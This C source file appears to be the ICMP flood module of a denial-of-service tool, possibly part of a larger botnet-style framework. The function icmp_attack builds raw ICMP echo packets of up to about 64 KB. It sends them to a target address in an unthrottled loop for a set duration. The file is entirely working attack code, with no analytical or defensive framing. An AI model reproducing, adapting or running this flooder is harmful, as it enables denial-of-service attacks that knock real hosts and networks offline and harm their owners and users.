#define _GNU_SOURCE

#include "headers/icmp_attack.h"
#include <sys/socket.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <errno.h>
#include <stddef.h>
#include <stdint.h>

void* icmp_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) return NULL;

    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        close(sock);
        return NULL;
    }

    const size_t ip_size = sizeof(struct iphdr);
    const size_t icmp_size = sizeof(struct icmphdr);
    
    size_t base_size = params->psize > 0 ? (size_t)params->psize : 56;
    if (base_size > 64500) base_size = 64500;
    size_t packet_size = base_size + ip_size;

    unsigned char *packet = calloc(1, packet_size);
    if (!packet) {
        close(sock);
        return NULL;
    }

    struct iphdr *iph = (struct iphdr*)packet;
    struct icmphdr *icmph = (struct icmphdr*)(packet + ip_size);

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons((uint16_t)packet_size);
    iph->id = htons(getpid() & 0xFFFF);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_ICMP;
    iph->check = 0;
    iph->saddr = INADDR_ANY;
    iph->daddr = params->target_addr.sin_addr.s_addr;

    icmph->type = ICMP_ECHO;
    icmph->code = 0;
    icmph->un.echo.id = htons(getpid() & 0xFFFF);
    icmph->un.echo.sequence = 0;
    icmph->checksum = 0;

    unsigned char *payload = packet + ip_size + icmp_size;
    for (size_t i = 0; i < base_size - icmp_size; i++) {
        payload[i] = (unsigned char)(i & 0xFF);
    }

    time_t end_time = time(NULL) + params->duration;
    uint32_t packets_sent = 0;
    
    while (params->active && time(NULL) < end_time) {
        icmph->un.echo.sequence = htons(packets_sent & 0xFFFF);
        icmph->checksum = 0;
        
        uint16_t *ptr = (uint16_t*)icmph;
        uint32_t sum = 0;
        size_t icmplen = base_size;
        
        while (icmplen > 1) {
            sum += *ptr++;
            icmplen -= 2;
        }
        if (icmplen == 1) {
            sum += *(unsigned char*)ptr;
        }
        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        icmph->checksum = (uint16_t)~sum;

        if (sendto(sock, packet, packet_size, 0, 
                  (struct sockaddr*)&params->target_addr, sizeof(params->target_addr)) > 0) {
            packets_sent++;
        }
    }

    free(packet);
    close(sock);
    return NULL;
}
